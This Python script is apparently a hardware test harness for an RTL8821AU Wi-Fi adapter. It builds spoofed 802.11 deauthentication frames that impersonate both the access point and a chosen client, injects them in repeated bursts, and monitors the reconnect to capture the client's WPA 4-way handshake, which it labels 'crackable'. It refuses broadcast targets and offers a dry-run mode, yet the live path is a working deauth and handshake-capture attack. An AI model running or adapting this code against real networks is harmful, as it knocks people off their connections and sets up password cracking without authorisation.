"""RTL8821AU (vendor/DKMS port) — live targeted-deauth injection harness (M6).

Drives the DKMS driver DIRECTLY (like ``test_hw.py``), since the port is intentionally
not registered in ``wlan/manager.py`` yet. Brings the card up, tunes to the target AP's
channel, and injects a burst of the classic bidirectional deauth (spoof-AP -> client and
spoof-client -> AP) via ``driver.inject_frame`` — the M6 TX path. This is the live gate
for TX: does the card actually emit a deauth that drops a client.

TX power is the BB-default (the per-rate EFUSE TX-power level is a separate deferred
milestone), so a *nearby* target is the reliable test; a distant client may not be
reached until that milestone lands.

TARGETED ONLY — ``--client`` must be a specific unicast STA. Broadcast/multicast is
refused on purpose: a broadcast deauth would knock every station on the BSSID off,
including this dev machine if it shares the AP, which would sever the session. Pick a
client that is NOT this machine.

Usage (card plugged in; on Linux unbind the kernel driver, on Windows Zadig/WinUSB):
    # SAFE preview — brings up + tunes + builds frames, transmits NOTHING:
    .venv\\Scripts\\python.exe scripts\\rtl8821au_dkms\\deauth_hw.py \\
        --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --channel 6 --dry-run
    # LIVE — actually injects the burst (omit --dry-run):
    .venv\\Scripts\\python.exe scripts\\rtl8821au_dkms\\deauth_hw.py \\
        --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --channel 6 --count 20

Target MACs stay on your terminal only; never commit them.
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import struct
import sys
import time
from pathlib import Path
from typing import TYPE_CHECKING

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import libusb_package
import usb.core

from _hwstop import interruptible_sleep

from wifit3.chips.rtl8821au_dkms.driver import Rtl8821auDkmsDriver

if TYPE_CHECKING:
    from wifit3.dot11.packet import Packet


def _str_to_mac(mac_str: str) -> bytes:
    parts = mac_str.split(":")
    if len(parts) != 6:
        raise ValueError(f"not a MAC address: {mac_str!r}")
    return bytes(int(x, 16) for x in parts)


def _build_deauth_frames(ap_mac: bytes, cl_mac: bytes) -> tuple[bytes, bytes]:
    """The two targeted deauth frames — mirrors ``WlanInterface.deauth`` (the canonical
    product builder). FC=0xC0 (deauth/mgmt), reason 7 (class-3 frame from nonassociated
    STA), HW fills the sequence. Both frames are unicast (addr1 = a real STA/AP), so
    neither is broadcast."""
    fc_dur = b"\xc0\x00\x00\x00"
    seq = b"\x00\x00"
    reason = struct.pack("<H", 7)
    # spoof the AP, addressed to the client: Addr1=client, Addr2=Addr3=AP(BSSID)
    client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason
    # spoof the client, addressed to the AP: Addr1=AP, Addr2=client, Addr3=AP(BSSID)
    ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason
    return client_deauth, ap_deauth


class _HandshakeTally:
    """Driver rx callback: watches for the deauth's effect — the target AP's beacons
    (confirms we're on-channel and hearing it), the target client's frames, and EAPOL
    frames (the 4-way handshake a reconnecting client emits = the deauth worked)."""

    def __init__(self, ap_bssid: str, client: str):
        self.ap = ap_bssid.lower()
        self.client = client.lower()
        self.frames = 0
        self.ap_beacons = 0
        self.client_frames = 0
        self.eapol = 0           # all EAPOL frames seen (any station)
        self.client_eapol = 0    # EAPOL frames involving the target client — the signal
        # Monitor-mode direction proof: ToDS (client->AP) = handshake M2/M4; FromDS
        # (AP->client) = M1/M3. Capturing ToDS frames not addressed to us is the test
        # that always-monitor RX is fully promiscuous (and that WPA M2 is reachable).
        self.eapol_to_ap = 0
        self.eapol_from_ap = 0
        self.tods_data = 0       # any ToDS data frame, any station (broad promiscuity)

    def __call__(self, parsed: Packet) -> None:
        self.frames += 1
        ftype = parsed.type
        bssid = (parsed.bssid or "").lower()
        src = (parsed.source or "").lower()
        dst = (parsed.dest or "").lower()
        to_ds = bool(parsed.to_ds)
        from_ds = bool(parsed.from_ds)
        involves_client = self.client in (src, dst)
        if ftype == "beacon" and bssid == self.ap:
            self.ap_beacons += 1
        if ftype in ("data", "wep_data", "eapol") and to_ds and not from_ds:
            self.tods_data += 1
        if ftype == "eapol":
            self.eapol += 1
            # A 4-way handshake has the client as src (M2/M4) or dst (M1/M3); only those
            # prove OUR deauthed client reconnected — another station's handshake doesn't.
            if involves_client:
                self.client_eapol += 1
                if to_ds and not from_ds:        # client -> AP : M2 / M4
                    self.eapol_to_ap += 1
                elif from_ds and not to_ds:      # AP -> client : M1 / M3
                    self.eapol_from_ap += 1
        if involves_client:
            self.client_frames += 1


async def run(args) -> int:
    client = args.client.lower()
    # Targeted-only guard: refuse broadcast / any group address (LSB of octet 0 set).
    first_octet = int(client.split(":")[0], 16)
    if client == "ff:ff:ff:ff:ff:ff" or (first_octet & 0x01):
        print(f"[REFUSED] --client {args.client} is broadcast/multicast. This harness is "
              f"targeted-only — pass a specific unicast STA (and not this machine).")
        return 2

    ap_mac = _str_to_mac(args.bssid)
    cl_mac = _str_to_mac(client)
    client_deauth, ap_deauth = _build_deauth_frames(ap_mac, cl_mac)

    print(f"[TARGET] deauth CLIENT {client} <-> AP {args.bssid.lower()} on ch "
          f"{args.channel}, {args.count}x burst")
    print(f"[SAFETY] confirm {client} is NOT this dev machine — targeted, never broadcast.")

    entry = Rtl8821auDkmsDriver.SUPPORTED_IDS[0]
    backend = libusb_package.get_libusb1_backend()
    dev = usb.core.find(idVendor=entry.vid, idProduct=entry.pid, backend=backend)
    if dev is None:
        print(f"[FAIL] no {entry.vid:04x}:{entry.pid:04x} on the USB bus")
        return 1
    try:
        dev.set_configuration()
    except usb.core.USBError as e:
        logging.debug("set_configuration: %s", e)

    driver = Rtl8821auDkmsDriver.from_usb_device(dev, entry)
    tally = _HandshakeTally(args.bssid, client)
    driver.register_rx_callback(tally)   # listen for the deauth's effect (handshake)

    def progress(pct, msg):
        print(f"  [{pct * 100:5.1f}%] {msg}")

    if not await driver.connect(progress):
        print("[FAIL] bring-up did not reach FW-ready")
        return 1
    await driver.set_channel(args.channel)
    print(f"[*] tuned to channel {args.channel}")

    if args.dry_run:
        print("[DRY-RUN] not transmitting. Built frames:")
        print(f"    client-deauth ({len(client_deauth)} B): {client_deauth.hex()}")
        print(f"    ap-deauth     ({len(ap_deauth)} B): {ap_deauth.hex()}")
        await driver.close()
        return 0

    print(f"[*] deauth-and-listen for {args.listen:g}s "
          f"({args.count}x burst every {args.interval:g}s), watching for the reconnect "
          f"handshake. Ctrl-C to stop.")
    start = time.monotonic()
    sent = 0
    try:
        while time.monotonic() - start < args.listen:
            for _ in range(args.count):                 # one deauth burst
                if await driver.inject_frame(client_deauth):
                    sent += 1
                if await driver.inject_frame(ap_deauth):
                    sent += 1
                await asyncio.sleep(0.005)
            # listen between bursts (Ctrl+C-interruptible) so the client reconnects
            await interruptible_sleep(args.interval)
            print(f"\r  {time.monotonic() - start:4.0f}s  sent={sent}  "
                  f"ap_beacons={tally.ap_beacons}  client_frames={tally.client_frames}  "
                  f"eapol={tally.client_eapol}/{tally.eapol}  "
                  f"M2M4={tally.eapol_to_ap} M1M3={tally.eapol_from_ap}  "
                  f"toDS={tally.tods_data}", end="")
    except (asyncio.CancelledError, KeyboardInterrupt):
        print("\n[stopping — Ctrl+C]")
    except usb.core.USBError as e:
        print(f"\n[FAIL] bulk-OUT error after {sent} frames: {e} "
              f"(if the pipe wedged, unplug/replug and rerun)")
        await driver.close()
        return 1
    print()
    await driver.close()

    print(f"[RESULT] injected {sent} deauth frames, no pipe fault. "
          f"Heard {tally.ap_beacons} target-AP beacons, {tally.frames} frames total, "
          f"{tally.client_frames} involving the client; EAPOL "
          f"{tally.client_eapol} from the client / {tally.eapol} total.")
    if tally.ap_beacons == 0:
        print("  [?] Did NOT hear the target AP on this channel — wrong channel / out of "
              "range / RX not working. The deauth test is inconclusive until we hear the AP.")
    elif tally.client_eapol > 0:
        print(f"  [PASS] Captured {tally.client_eapol} EAPOL handshake frame(s) FROM/TO the "
              "target client — it reconnected, so the deauth landed and TX is confirmed.")
    elif tally.eapol > 0:
        print(f"  [?] Saw {tally.eapol} EAPOL frame(s) but NONE involving the target client "
              "— that's another station's handshake, not proof our deauth worked.")
    elif tally.client_frames > 0:
        print("  [~] Heard the AP and the client, but no reconnect handshake — the client "
              "stayed associated, so the deauth likely isn't reaching it (TX suspect).")
    else:
        print("  [~] Heard the AP but no client traffic/handshake — client idle/absent, or "
              "the deauth isn't being transmitted. Inconclusive.")

    # Monitor-mode direction proof: did we capture client->AP (ToDS) frames not addressed
    # to us? That's the test that always-monitor is fully promiscuous, and that the
    # crackable WPA messages (M2 ToDS) are reachable.
    print(f"  [MONITOR] handshake msgs to/from client — M2/M4 (client->AP, ToDS)="
          f"{tally.eapol_to_ap}, M1/M3 (AP->client, FromDS)={tally.eapol_from_ap}; "
          f"ToDS data frames seen (any STA)={tally.tods_data}.")
    if tally.eapol_to_ap > 0:
        print("    [OK] captured client->AP handshake frames (M2/M4) — full promiscuous "
              "monitor, and a crackable WPA handshake is reachable.")
    elif tally.tods_data > 0:
        print("    [OK] captured client->AP (ToDS) data frames not addressed to us — "
              "promiscuous monitor works; this run just didn't catch an M2/M4 specifically.")
    else:
        print("    [!] saw NO client->AP (ToDS) frames at all — possible ToDS-filter gap "
              "(only hearing AP->client). WPA M2 would be unreachable; investigate the RX filter.")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="RTL8821AU DKMS targeted-deauth harness (M6)")
    ap.add_argument("--bssid", required=True, help="target AP BSSID (AA:BB:CC:DD:EE:FF)")
    ap.add_argument("--client", required=True,
                    help="target client STA (unicast only — broadcast is refused)")
    ap.add_argument("--channel", type=int, required=True, help="the AP's 2.4G channel")
    ap.add_argument("--count", type=int, default=10, help="frames per deauth burst (default 10)")
    ap.add_argument("--listen", type=float, default=30.0,
                    help="deauth-and-listen window in seconds (default 30)")
    ap.add_argument("--interval", type=float, default=2.0,
                    help="seconds between deauth bursts while listening (default 2)")
    ap.add_argument("--dry-run", action="store_true",
                    help="bring up + tune + build frames, but transmit NOTHING")
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    try:
        return asyncio.run(run(args))
    except KeyboardInterrupt:        # second Ctrl+C, or a cancel that escaped run()
        return 130


if __name__ == "__main__":
    sys.exit(main())
